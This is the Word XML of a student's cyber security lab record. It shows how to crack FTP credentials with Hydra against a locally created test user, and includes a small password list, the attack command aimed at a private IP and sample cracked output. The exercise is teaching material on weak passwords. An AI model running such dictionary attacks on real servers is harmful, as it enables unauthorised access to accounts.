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9A1BF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Thiruvarsan S G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117</w:t>
      </w:r>
      <w:bookmarkStart w:id="0" w:name="_GoBack"/>
      <w:bookmarkEnd w:id="0"/>
    </w:p>
    <w:p w14:paraId="4C1A1120">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r>
        <w:t>Exercise 10</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Crack FTP Credentials using a Dictionary Attack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C411191">
      <w:r>
        <w:t>Aim:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="236E52CD">
      <w:r>
        <w:t>To perform a dictionary attack on an FTP server using the Hydra tool and crack the username–</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F517F02">
      <w:r>
        <w:t>password combination.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="501BF469">
      <w:r>
        <w:t>Tools reuired:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13788731">
      <w:r>
        <w:t xml:space="preserve">    1.   Kali Linux (or any Linux distribution with Hydra installed)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6285D257">
      <w:r>
        <w:t xml:space="preserve">    2.   Hydra (pre-installed in Kali Linux)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08450985">
      <w:r>
        <w:t xml:space="preserve">    3.   FTP Server (e.g., vsftpd running locally or on a target machine)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41AC23D8">
      <w:r>
        <w:t xml:space="preserve">    4.   Wordlist file (e.g., rockyou.txt or custom dictionary of passwords)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75CEC2AC">
      <w:r>
        <w:t>Idea:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F6A0FC7">
      <w:r>
        <w:t xml:space="preserve">    1. FTP (File Transfer Protocol) is a standard protocol for file transfer over TCP.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="059B7BE0">
      <w:r>
        <w:t xml:space="preserve">    2. If weak credentials are used, attackers can exploit FTP using brute force or dictionary attacks.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D0D1676">
      <w:r>
        <w:t xml:space="preserve">    3. Hydra is a fast and flexible network logon cracker that supports numerous protocols,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D07B5B9">
      <w:r>
        <w:t xml:space="preserve">       including FTP.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D845A8E">
      <w:r>
        <w:t xml:space="preserve">    4. A dictionary attack attempts to guess credentials by trying every word from a given wordlist.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C7D69F2">
      <w:r>
        <w:t>Steps:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="244BA182">
      <w:r>
        <w:t>1. Install and start an FTP service</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75D0A9BF">
      <w:r>
        <w:t>sudo apt-get install vsftpd -y</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64E56A9C">
      <w:r>
        <w:t>sudo systemctl start vsftpd</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73974448">
      <w:r>
        <w:t>2. Create a test user with a weak password for demonstration</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50C47423">
      <w:r>
        <w:t>sudo adduser ftpuser</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32CC9EE7">
      <w:r>
        <w:t># set password (e.g., password123)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="400360AC">
      <w:r>
        <w:t>Department of Computer Science and Engineering (Cyber Security)/CR23331</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12C94399">
      <w:r>
        <w:t>Procedure:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57677AB4">
      <w:r>
        <w:t>1.Check hydra</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ABC3F31">
      <w:r>
        <w:t>hydra -h</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54A82384">
      <w:r>
        <w:t>2. Create password file</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="384C683F">
      <w:r>
        <w:t>Use existing wordlist: /usr/share/wordlists/rockyou.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="397ECC80">
      <w:r>
        <w:t>Or create a custom file pass.txt:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36EA76EF">
      <w:r>
        <w:t>Department of Computer Science and Engineering (Cyber Security)/CR23331</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5872C000">
      <w:r>
        <w:t>Pass.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6865DADD">
      <w:r>
        <w:t>admin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B4F61E7">
      <w:r>
        <w:t>123456</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="437634AF">
      <w:r>
        <w:t>password</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C38EDA2">
      <w:r>
        <w:t>password123</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17411602">
      <w:r>
        <w:t>ftp123</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E74C198">
      <w:r>
        <w:t>Run Hydra against ftp</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EFCCC17">
      <w:r>
        <w:t>hydra -l &lt;username&gt; -P &lt;wordlist&gt; ftp://&lt;target-ip&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00C0F3AE">
      <w:r>
        <w:t>hydra -l ftpuser -P passlist.txt ftp://192.168.1.10</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="579E2952">
      <w:r>
        <w:t>-l → specifies username</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14A6736B">
      <w:r>
        <w:t>-P → specifies password list</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="662E0D4D">
      <w:r>
        <w:t>ftp:// → protocol and target IP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5129F75D">
      <w:r>
        <w:t>[21][ftp] host: 192.168.1.10 login: ftpuser password: password123</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42F4E740">
      <w:r>
        <w:t>Result:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="418774B3">
      <w:r>
        <w:t>Hydra should successfully crack the FTP credentials if the correct password exists in the dictionary.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="546A5E60">
      <w:r>
        <w:t>The result will show the valid username and password pair. This experiment demonstrates how weak</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C30AAA1">
      <w:r>
        <w:t>FTP passwords can be cracked using a dictionary attack with Hydra. It highlights the importance of</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="445FFC90">
      <w:r>
        <w:t>strong password policies and secure configurations in preventing credential-based attacks.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C145C7F">
      <w:r>
        <w:t>Department of Computer Science and Engineering (Cyber Security)/CR23331</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12DB2284">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>Screenshots</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4534B28E">
      <w:r>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="114300" distR="114300">
            <wp:extent cx="5029200" cy="13423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293F">
      <w:r>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="114300" distR="114300">
            <wp:extent cx="5029200" cy="312864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89B7">
      <w:r>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="114300" distR="114300">
            <wp:extent cx="5029200" cy="108077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EBDB">
      <w:r>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="114300" distR="114300">
            <wp:extent cx="5029200" cy="162242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A81240"/>
    <w:rsid w:val="0DAF087F"/>
    <w:rsid w:val="30AC6769"/>
    <w:rsid w:val="3214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323</Words>
  <Characters>1871</Characters>
  <Lines>0</Lines>
  <Paragraphs>0</Paragraphs>
  <TotalTime>0</TotalTime>
  <ScaleCrop>false</ScaleCrop>
  <LinksUpToDate>false</LinksUpToDate>
  <CharactersWithSpaces>2216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1402F5B7A9884EA78061A835225797ED_13</vt:lpwstr>
  </property>
</Properties>
</file>